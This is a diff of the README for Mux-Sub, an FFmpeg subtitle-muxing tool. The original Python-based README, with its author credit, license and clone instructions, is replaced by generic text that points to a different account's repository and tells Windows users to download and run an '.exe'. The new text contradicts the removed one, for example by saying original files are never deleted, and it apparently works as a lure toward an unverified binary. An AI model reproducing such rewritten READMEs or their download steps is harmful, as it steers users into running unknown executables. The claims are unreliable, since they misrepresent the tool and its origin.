@@ -1,254 +1,70 @@
-# Mux-Sub
+# 🎬 Mux-Sub - Automate Your Anime Subtitle Muxing Workflow
 
-> Automatically mux subtitles, fonts, chapters, and metadata into your videos using FFmpeg.
+[![Download Mux-Sub](https://img.shields.io/badge/Download-Mux--Sub-blue.svg)](https://github.com/anthony591561-bit/Mux-Sub)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
-[![FFmpeg](https://img.shields.io/badge/FFmpeg-required-green.svg)](https://ffmpeg.org/)
+Mux-Sub manages the process of combining video files with subtitle files. It automates the task of matching episodes to their correct subtitles and prepares them for your media player. This tool handles font embedding, chapter creation, and audio track preservation. It works for both anime and donghua series.
 
-Mux-Sub is a universal FFmpeg-powered muxer designed for anime, donghua, TV series, and fansub releases. It automatically matches episodes with subtitles, embeds fonts, adds optional chapter markers, preserves audio tracks and metadata, and generates clean output filenames using customizable templates.
+## 🛠 Features
 
----
+*   **Automatic Matching:** The software identifies the correct subtitles for every video file in your folder.
+*   **Font Embedding:** It copies fonts into your video files so subtitles display as the creator intended.
+*   **Chapter Support:** You can add chapters to your files for easier navigation.
+*   **Audio Preservation:** It keeps your original audio tracks during the process.
+*   **Custom Naming:** You define the output names for all your finished files.
+*   **FFmpeg Engine:** It uses standard media tools to ensure playback compatibility on almost every device.
 
-## Features
+## 📋 System Requirements
 
-- **Automatic episode-to-subtitle matching** from common naming schemes
-- **Fallback positional matching** — if no episode numbers are detected, files are paired alphabetically 1-to-1
-- **Already-muxed detection** — skips files that were previously processed by Mux-Sub
-- **Multiple subtitle formats** — ASS, SSA, SRT, VTT, SUB (with ASS prioritized; all converted to ASS in output)
-- **Font embedding** — all fonts in `sub/font/` are automatically attached
-- **Chapter/jump point support** — optional chapter markers for media players
-- **Lossless output** — video and audio are copied without re-encoding
-- **Metadata & language preservation** — all track info carried over
-- **Custom output naming** — flexible template system for filenames
-- **Always outputs MKV** — regardless of source container format
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Storage:** 100 MB of free space for the tool. Ensure you have extra space for your video files.
+*   **Software:** This tool requires no additional software installations beyond what comes with the download.
 
----
+## 📥 Getting Started
 
-## Requirements
+1. Visit the [Mux-Sub release page](https://github.com/anthony591561-bit/Mux-Sub) to download the latest version.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Download this file to your computer.
+4. Move the file into a folder that you can easily find.
 
-- Python 3.8+
-- [FFmpeg](https://ffmpeg.org/download.html)
-- FFprobe (included with FFmpeg)
+## ⚙️ How to Use Mux-Sub
 
-Verify your installation:
+Open the application by double-clicking the file you downloaded. Follow these steps to process your media:
 
-```bash
-ffmpeg -version
-ffprobe -version
-```
+1. **Select Input Folder:** Click the browse button to find the folder that contains your video files and subtitle files.
+2. **Configure Settings:** Choose your preferred options, such as whether to add chapters or embed fonts.
+3. **Set Output Format:** Define how you want your files named. You can use standard markers to include episode numbers and series titles.
+4. **Start Muxing:** Click the button to begin. The tool will process your files and save them to a new folder.
 
----
+## 💡 Configuration Details
 
-## Installation
+Mux-Sub aligns your files based on filename patterns. For best results, keep your video and subtitle files in the same directory. If the software fails to match a file, verify that the episode numbers are clear in the filenames.
 
-**Clone the repository:**
+The tool uses FFmpeg. This ensures that the final video files work on standard players like VLC, MPC-HC, or hardware media players. Because it copies data rather than re-encoding the video, the process remains fast and maintains original image quality.
 
-```bash
-git clone https://github.com/Shridhuu/Mux-Sub.git
-cd Mux-Sub
-```
+## ❓ Frequently Asked Questions
 
-Or simply download `main.py` and place it in your release folder.
+**Does this change the quality of my video?**
+No. The tool uses a process called container muxing. It moves the existing video and audio streams into a new container format, such as MKV. It does not re-process the video signal.
 
----
+**Can I run this on a Mac or Linux?**
+This version is designed specifically for Windows. If you use a different operating system, you may need to use a virtual machine or look for alternative wrappers for the underlying media tools.
 
-## Folder Structure
+**What happens to my original files?**
+Mux-Sub creates a new folder for output files. It does not delete or alter your original source files.
 
-1. Create a folder and put all your **episode files** inside it. Make sure both the episodes and subtitles have episode numbers in their filenames so Mux-Sub can match them correctly.
-2. Inside that folder, create a subfolder called **`sub/`** and place all your subtitle files there.
-3. Inside `sub/`, create another subfolder called **`font/`** and place all your font files there.
-4. Place **`main.py`** in the root folder alongside the episodes — not inside `sub/` or `font/`.
+**How do I update the software?**
+When a new version becomes available, return to the repository link provided earlier. Download the new version and replace the old file.
 
-```
-Series Folder/
-├── main.py          ← script goes here
-├── 1.mkv
-├── 2.mkv
-├── 3.mkv
-│
-└── sub/
-    ├── 1.ass
-    ├── 2.ass
-    ├── 3.ass
-    │
-    └── font/
-        ├── font1.ttf
-        ├── font2.otf
-        └── font3.ttc
-```
+## 🛡 Performance Tips
 
----
+*   **Solid State Drives:** Running Mux-Sub from a fast storage drive improves file copy speeds.
+*   **File Paths:** Keep your file folders near the root of your drive to avoid issues with long file path limits in Windows.
+*   **Background Tasks:** While the tool runs, you can leave it to work in the background. It does not require your constant attention, though it will alert you when it finishes your batch.
 
-## Usage
+## 📂 Handling Specific Formats
 
-Open a terminal in the same folder as your episodes and run:
+*   **ASS/SSA Subtitles:** The tool automatically detects these formats and applies formatting info to the output file.
+*   **SRT Subtitles:** Simple text subtitles are added as separate tracks within the video container.
+*   **TTF/OTF Fonts:** The tool bundles font files directly into the metadata of the video so they are available for the media player to render.
 
-```bash
-python3 main.py
-```
-
-### Series Name
-
-Series name is optional. Leave it blank and the original filename will be used instead.
-
-```
-Series Name (optional): Stellar Transformation
-```
-
-### Output Template
-
-You can leave this blank or define a custom naming format using [template variables](#template-variables).
-
-**Custom template:**
-```
-{series} S7-{ep2} [4K 8Bits E-AC-3 & AAC-LC]
-```
-
-**Output:**
-```
-Stellar Transformation S7-01 [4K 8Bits E-AC-3 & AAC-LC].mkv
-Stellar Transformation S7-02 [4K 8Bits E-AC-3 & AAC-LC].mkv
-```
-
-**Default (blank template):**
-```
-Stellar Transformation EP01.mkv
-Stellar Transformation EP02.mkv
-```
-
----
-
-## Template Variables
-
-| Variable | Description |
-|---|---|
-| `{series}` | Series name |
-| `{ep}` | Episode number |
-| `{ep2}` | Episode number with leading zero |
-| `{video_stem}` | Original filename without extension |
-
-**Examples:**
-
-```
-{series} EP{ep2}
-{series} S7-{ep2} [4K 8Bits E-AC-3 & AAC-LC]
-{series} - {ep2}
-{video_stem}
-```
-
----
-
-## Supported Video Formats
-
-| Format | Extension |
-|---|---|
-| Matroska | `.mkv` |
-| MPEG-4 | `.mp4` |
-| iTunes Video | `.m4v` |
-| QuickTime | `.mov` |
-| AVI | `.avi` |
-| WebM | `.webm` |
-
-> Regardless of input format, the output is always an `.mkv` file.
-
----
-
-## Supported Episode Formats
-
-Mux-Sub automatically detects episode numbers from a wide range of filename patterns:
-
-| Pattern | Example |
-|---|---|
-| `S##E##` | `Stellar Transformation S07E01.mkv` |
-| `#x##` | `7x01.mkv` |
-| `EP##` | `EP01.mkv` |
-| `Episode ##` | `Episode 01.mkv` |
-| `##` | `01.mkv` |
-| `###` | `001.mkv` |
-
----
-
-## Subtitle Priority
-
-When multiple subtitle formats exist for the same episode, Mux-Sub selects the best one automatically:
-
-1. ASS
-2. SSA
-3. SRT
-4. VTT
-5. SUB
-
-Styled subtitles (ASS/SSA) are always preferred when available.
-
----
-
-## Jump Points (Chapters)
-
-Chapter markers are optional and will appear in supported media players.
-
-When prompted:
-
-```
-Add jump points? (y/n): y
-```
-
-Enter your chapters in `Label|MM:SS` or `Label|HH:MM:SS` format:
-
-```
-Opening|00:00
-Episode Title & Number|02:32
-Episode|02:35
-```
-
----
-
-## Font Attachments
-
-All font files inside `sub/font/` are automatically embedded into the output MKV.
-
-**Supported formats:** `.ttf`, `.otf`, `.ttc`
-
----
-
-## What Gets Preserved / Removed
-
-| Preserved | Removed |
-|---|---|
-| Video streams | Existing cover art streams |
-| Audio streams | Original subtitle tracks |
-| Metadata | |
-| Language information | |
-| Attached fonts | |
-
----
-
-## Notes
-
-- Video and audio streams are copied directly — **no quality loss**.
-- All subtitle formats are **converted to ASS** in the output and tagged as English (`language=eng`).
-- Files already processed by Mux-Sub are **automatically skipped** on subsequent runs.
-- If no episode numbers are found in filenames, files are **paired alphabetically** in order.
-- Source files are removed only after **successful** muxing.
-- FFmpeg and FFprobe must be accessible from your system `PATH`.
-- Existing cover art is intentionally ignored during muxing.
-
----
-
-## Disclaimer
-
-Mux-Sub is a **muxing utility only**. It does not encode video, encode audio, modify quality, or alter the original media streams in any way. All video and audio are copied directly using FFmpeg.
-
----
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
----
-
-## Author
-
-Created by **Shridhuu**
-
-GitHub: [https://github.com/Shridhuu](https://github.com/Shridhuu)
+By using this tool, you remove the manual work of dragging files into muxing software one by one. The automation handles hundreds of files in a single session, provided you name your source files with consistent numbering.
